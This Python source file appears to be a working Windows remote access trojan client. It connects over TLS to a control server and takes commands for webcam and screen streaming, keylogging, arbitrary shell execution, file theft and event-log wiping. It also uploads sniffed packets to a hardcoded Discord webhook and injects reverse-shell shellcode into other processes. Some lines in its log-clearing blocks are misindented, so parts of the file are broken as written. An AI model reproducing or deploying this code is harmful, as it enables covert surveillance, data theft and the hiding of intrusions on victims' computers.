import socket
import cv2
import pyautogui
import numpy as np
import scapy.all as scapy
import threading
import requests
import subprocess
import keyboard  # Import the keyboard library
import psutil  # To list and identify network interfaces
import io  # For in-memory byte streams
import winreg  # For accessing the Windows registry
import hashlib  # For calculating the hboot key
import binascii  # For converting to/from binary and ASCII
import os  # For process management
import ctypes  # For Windows API calls
import ssl  # Import ssl module for TLS
import struct  # Import struct module for TLV

# Function to get the default network interface
def get_default_interface():
    interfaces = psutil.net_if_addrs()
    for interface in interfaces:
        # Loop through interfaces and check for IPv4 addresses (this assumes active interfaces)
        for addr in interfaces[interface]:
            if addr.family == socket.AF_INET:  # AF_INET is IPv4
                return interface  # Return the first active interface with an IPv4 address
    return None  # If no interface found

# Dynamically identify the interface
INTERFACE = get_default_interface()
if INTERFACE is None:
    print("No suitable network interface found!")
    exit(1)

sniffer_running = False  # Global flag for sniffing state
lock = threading.Lock()  # Synchronization lock
keylogger_data = []  # List to store keylogger data
keylogger_running = False  # Flag to check if keylogger is running

# TLV Types
TLV_TYPE_COMMAND = 1
TLV_TYPE_RESPONSE = 2
TLV_TYPE_KEYLOGGER = 3
TLV_TYPE_STREAM = 4

def tlv_encode(tlv_type, value):
    length = len(value)
    return struct.pack("!I", tlv_type) + struct.pack("!I", length) + value

def tlv_decode(data):
    tlv_type = struct.unpack("!I", data[:4])[0]
    length = struct.unpack("!I", data[4:8])[0]
    value = data[8:8+length]
    return tlv_type, value

def screen_stream(client_socket):
    while True:
        try:
            screen = pyautogui.screenshot()
            screen = np.array(screen)
            _, buffer = cv2.imencode('.jpg', screen)
            client_socket.sendall(buffer.tobytes())
        except pyautogui.PyAutoGUIException as e:
            print(f"PyAutoGUIException: {e}")
            break
        except Exception as e:
            print(f"An error occurred: {e}")
            break

def webcam_stream(client_socket):
    cap = cv2.VideoCapture(0)
    while cap.isOpened():
        ret, frame = cap.read()
        if not ret or frame is None:
            print("Failed to capture image from webcam.")
            continue
        _, buffer = cv2.imencode('.jpg', frame)
        try:
            client_socket.sendall(buffer.tobytes())
        except:
            break
    cap.release()

def sniffer_start():
    global sniffer_running
    with lock:  # Prevent starting multiple sniffers simultaneously
        if sniffer_running:
            print("Sniffer is already running.")
            return
        sniffer_running = True

    def sniff_and_upload(pkt):
        # Instead of saving to file, we store the packet in memory and upload
        packet_bytes = bytes(pkt)
        webhook_url = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'
        
        try:
            # Upload the captured packet directly (could be done in batches or as individual packets)
            response = requests.post(webhook_url, files={'file': ('packet.cap', io.BytesIO(packet_bytes))})
            print(f"Packet uploaded: {response.status_code}")
        except Exception as e:
            print(f"Error uploading packet: {e}")

    try:
        print(f"Sniffing on interface: {INTERFACE}")
        scapy.sniff(iface=INTERFACE, timeout=60, prn=sniff_and_upload, store=False)  # Avoid storing packets in memory
    except Exception as e:
        print(f"Sniffer error: {e}")
    finally:
        sniffer_running = False  # Reset flag after sniffing

def shell(client_socket):
    while True:
        try:
            data = client_socket.recv(4096)
            tlv_type, command = tlv_decode(data)
            command = command.decode('utf-8')
            if command.lower() == "exit":
                break
            elif command.lower().startswith("migrate"):
                try:
                    parts = command.split(' ')  # Split the command into parts
                    if len(parts) != 2:
                        client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, b"Error: Invalid migration command format. Use 'migrate <PID>'.\n"))
                        continue
                    
                    target_pid = int(parts[1])  # Convert the second part to an integer (PID)
                    current_process = psutil.Process()
                    current_process_id = current_process.pid
                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Running module against {socket.gethostname()}\n".encode('utf-8')))
                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Current server process: {current_process.name()} ({current_process_id})\n".encode('utf-8')))
                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Migrating to process ID {target_pid}...\n".encode('utf-8')))

                    # Attempt to migrate to the target process
                    migrate_to_process(target_pid)
                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Migration complete. New server process ID: {target_pid}\n".encode('utf-8')))
                except ValueError:
                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, b"Error: PID should be an integer.\n"))
                except psutil.NoSuchProcess:
                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, b"Error: Target process not found.\n"))
                except Exception as e:
                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Migration error: {e}\n".encode('utf-8')))
            elif command.lower().startswith("upload"):
                try:
                    parts = command.split(' ')
                    if '-d' in parts:
                        dest_index = parts.index('-d') + 1
                        if dest_index < len(parts):
                            destination = parts[dest_index]
                            filename = parts[1]
                            print(f"[*] Uploading: {filename} -> {destination}")

                            # Open the file and send it
                            if os.path.exists(filename):
                                with open(filename, 'rb') as f:
                                    data = f.read()
                                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, data))
                                print(f"[*] File {filename} uploaded to {destination}")
                            else:
                                client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, b"Error: File not found."))
                                print(f"[*] File {filename} not found.")
                        else:
                            client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, b"Error: No destination specified."))
                            print("[*] Error: No destination specified.")
                    else:
                        client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, b"Error: Invalid command format. Use 'upload filename -d destination'."))
                        print("[*] Error: Invalid command format.")
                except Exception as e:
                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"Error: {e}\n".encode('utf-8')))
                    print(f"[*] Error: {e}")

            elif command.lower() == "clearev":
                try:
                    application_log = subprocess.run("wevtutil cl Application", shell=True, capture_output=True, text=True)
                    system_log = subprocess.run("wevtutil cl System", shell=True, capture_output=True, text=True)
                    security_log = subprocess.run("wevtutil cl Security", shell=True, capture_output=True, text=True)
                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {application_log.stdout.count('\\\\n')} records from Application...\n".encode('utf-8')))
client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {system_log.stdout.count('\\\\n')} records from System...\n".encode('utf-8')))
client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {security_log.stdout.count('\\\\n')} records from Security...\n".encode('utf-8')))
                except Exception as e:
                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"Error: {e}\n".encode('utf-8')))
            else:
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, output.stdout.encode('utf-8') or b"Command executed, but no output."))
        except Exception as e:
            client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, str(e).encode('utf-8')))

def migrate_to_process(target_pid):
    # Windows-specific process migration using Win32 API
    PROCESS_ALL_ACCESS = 0x1F0FFF
    kernel32 = ctypes.windll.kernel32

    # Shellcode to inject
    shellcode = (
        b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        b"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
        b"\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48"
        b"\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b"
        b"\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38"
        b"\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24"
        b"\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01"
        b"\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f"
        b"\x5a\x8b\x12\xe9\x86\x00\x00\x00\x5d\x68\x33\x32\x00\x00\x68"
        b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
        b"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x05"
        b"\x68\xc0\xa8\x01\x64\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50"
        b"\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02"
        b"\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff"
        b"\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00"
        b"\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58"
        b"\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
        b"\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3"
    )

    # Get a handle to the target process
    target_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
    if not target_handle:
        raise Exception(f"Unable to open target process. Error code: {kernel32.GetLastError()}")

    # Allocate memory in the target process
    remote_memory = kernel32.VirtualAllocEx(target_handle, None, len(shellcode), 0x3000, 0x40)
    if not remote_memory:
        raise Exception(f"Unable to allocate memory in target process. Error code: {kernel32.GetLastError()}")

    # Write the shellcode to the allocated memory
    written = ctypes.c_size_t(0)
    if not kernel32.WriteProcessMemory(target_handle, remote_memory, shellcode, len(shellcode), ctypes.byref(written)):
        raise Exception(f"Unable to write to target process memory. Error code: {kernel32.GetLastError()}")

    # Create a remote thread to execute the shellcode
    thread_id = ctypes.c_ulong(0)
    if not kernel32.CreateRemoteThread(target_handle, None, 0, remote_memory, None, 0, ctypes.byref(thread_id)):
        raise Exception(f"Unable to create remote thread in target process. Error code: {kernel32.GetLastError()}")

    # Close the target process handle
    kernel32.CloseHandle(target_handle)
    
def keylogger_callback(event):
    global keylogger_data
    if event.name == 'space':
        keylogger_data.append(' ')  # Handle space key
    elif event.name == 'enter':
        keylogger_data.append('')  # Enter doesn't do anything in the string (we can skip it)
    elif event.name == 'backspace':
        if len(keylogger_data) > 0:
            keylogger_data.pop()  # Remove the last character on backspace
    elif event.name not in ['shift', 'ctrl', 'alt', 'tab', 'caps lock', 'esc']:
        keylogger_data.append(event.name)  # Append other normal keys


def start_keylogger():
    global keylogger_running
    if not keylogger_running:
        keyboard.on_press(keylogger_callback)
        keylogger_running = True
        print("Keylogger started.")

def stop_keylogger():
    global keylogger_running
    if keylogger_running:
        keyboard.unhook_all()
        keylogger_running = False
        print("Keylogger stopped.")

def dump_keylogger_data():
    global keylogger_data
    # Join the captured keylogger data into a single string and return it as one line
    return ''.join(keylogger_data)

def list_webcams():
    webcams = []
    index = 0
    while True:
        try:
            cap = cv2.VideoCapture(index)
            if cap.isOpened():
                # Get the webcam name (this depends on your platform)
                webcam_name = f"{index}: {cap.getBackendName()}"
                webcams.append(webcam_name)
                cap.release()  # Release the capture object after checking
            else:
                cap.release()
                break
        except Exception as e:
            print(f"Error accessing camera at index {index}: {e}")
            break
        index += 1
    if not webcams:
        return "No webcams found."
    return '\n'.join(webcams)

def main():
    try:
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.load_verify_locations('server.crt')
        
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket = context.wrap_socket(raw_socket, server_side=False, do_handshake_on_connect=True)
        client_socket.connect(('10.0.1.33', 9999))
    except Exception as e:
        print(f"Connection failed: {e}")
        return

    while True:
        try:
            data = client_socket.recv(4096)
            tlv_type, command = tlv_decode(data)
            command = command.decode('utf-8')
            if command == "webcam_stream":
                threading.Thread(target=webcam_stream, args=(client_socket,), daemon=True).start()
            elif command == "screenshare":
                threading.Thread(target=screen_stream, args=(client_socket,), daemon=True).start()
            elif command == "sniffer_start":
                threading.Thread(target=sniffer_start, daemon=True).start()
            elif command == "shell":
                shell(client_socket)
            elif command == "keyscan_start":
                start_keylogger()
            elif command == "keyscan_stop":
                stop_keylogger()
            elif command == "keyscan_dump":
                client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, dump_keylogger_data().encode('utf-8')))
            elif command == "webcam_list":
                print("[*] Requesting webcam list...")
                webcam_list = list_webcams()
                client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, webcam_list.encode('utf-8')))
            elif command.lower().startswith("download"):
                try:
                    parts = command.split(' ')
                    if len(parts) < 2:
                        client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, b"Error: Usage: download <file_to_download>"))
                        continue

                    file_to_download = parts[1]
                    if os.path.exists(file_to_download):
                        with open(file_to_download, 'rb') as f:
                            data = f.read()
                            client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, data))
                        print(f"[*] File '{file_to_download}' downloaded successfully.")
                    else:
                        client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, b"Error: File not found."))
                        print(f"[*] File '{file_to_download}' not found.")
                except Exception as e:
                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"Error: {e}\n".encode('utf-8')))
                    print(f"[*] Error: {e}")
            elif command == "clearev":
                try:
                    application_log = subprocess.run("wevtutil cl Application", shell=True, capture_output=True, text=True)
                    system_log = subprocess.run("wevtutil cl System", shell=True, capture_output=True, text=True)
                    security_log = subprocess.run("wevtutil cl Security", shell=True, capture_output=True, text=True)
                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {application_log.stdout.count('\\\\n')} records from Application...\n".encode('utf-8')))
client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {system_log.stdout.count('\\\\n')} records from System...\n".encode('utf-8')))
client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {security_log.stdout.count('\\\\n')} records from Security...\n".encode('utf-8')))
                except Exception as e:
                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"Error: {e}\n".encode('utf-8')))
        except Exception as e:
            print(f"Error: {e}")
            break

if __name__ == "__main__":
    main()
